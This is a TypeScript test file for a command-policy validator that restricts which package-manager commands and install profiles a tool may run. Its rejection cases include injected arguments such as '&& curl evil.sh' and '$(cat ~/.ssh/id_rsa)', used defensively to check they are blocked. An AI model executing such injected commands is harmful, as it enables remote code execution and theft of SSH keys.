import {
  CommandPolicyError,
  describeCommand,
  selectCommandProfile,
  validateCommandProfile,
  validateInstallProfile,
  validateRepositoryChecks,
} from "./command-policy";
import type { CommandProfile } from "./command-policy";

const testProfile: CommandProfile = { id: "test", executable: "pnpm", args: ["test", "--", "--ci"], timeoutMs: 120_000 };

describe("command policy", () => {
  it("accepts a configured profile", () => {
    expect(validateCommandProfile(testProfile)).toBe(testProfile);
  });

  it.each([
    [{ ...testProfile, executable: "bash" }],
    [{ ...testProfile, executable: "/usr/bin/npm" }],
    [{ ...testProfile, args: ["test", "&&", "curl", "evil.sh"] }],
    [{ ...testProfile, args: ["$(cat ~/.ssh/id_rsa)"] }],
    [{ ...testProfile, timeoutMs: 0 }],
    [{ ...testProfile, timeoutMs: 60 * 60 * 1000 }],
    [{ ...testProfile, id: "Bad Id" }],
  ])("rejects unsafe profile %#", (profile) => {
    expect(() => validateCommandProfile(profile)).toThrow(CommandPolicyError);
  });

  it("rejects profile ids that are not configured", () => {
    expect(() => selectCommandProfile([testProfile], "rm-rf")).toThrow(CommandPolicyError);
    expect(selectCommandProfile([testProfile], "test")).toBe(testProfile);
  });
});

describe("install policy", () => {
  const install = { id: "install", executable: "pnpm", args: ["install", "--frozen-lockfile", "--ignore-scripts"], timeoutMs: 300_000 };

  it("accepts a package manager install with lifecycle scripts disabled", () => {
    expect(validateInstallProfile(install)).toBe(install);
    expect(() => validateInstallProfile({ ...install, executable: "yarn", args: ["install", "--mode=skip-build"] })).not.toThrow();
    expect(() => validateInstallProfile({ ...install, executable: "npm", args: ["ci", "--ignore-scripts"] })).not.toThrow();
  });

  it.each([
    [{ ...install, args: ["install", "--frozen-lockfile"] }, /lifecycle scripts/],
    [{ ...install, executable: "node", args: ["install", "--ignore-scripts"] }, /npm, pnpm, or yarn/],
    [{ ...install, args: ["run", "postinstall", "--ignore-scripts"] }, /install or ci/],
    [{ ...install, args: ["install", "--ignore-scripts", "&&", "curl"] }, /Argument not allowed/],
  ])("rejects %#", (profile, message) => {
    expect(() => validateInstallProfile(profile)).toThrow(message);
  });
});

describe("validateRepositoryChecks", () => {
  const check = { id: "test", kind: "test" as const, executable: "pnpm", args: ["test"], timeoutMs: 600_000 };

  it("validates every profile and rejects duplicate ids", () => {
    expect(() => validateRepositoryChecks({ install: null, checks: [check] })).not.toThrow();
    expect(() => validateRepositoryChecks({ install: null, checks: [check, check] })).toThrow(/Duplicate/);
    expect(() => validateRepositoryChecks({ install: null, checks: [{ ...check, executable: "sh" }] })).toThrow(/not allowed/);
  });
});

describe("describeCommand", () => {
  it("joins the executable and arguments for display", () => {
    expect(describeCommand(testProfile)).toBe("pnpm test -- --ci");
  });
});
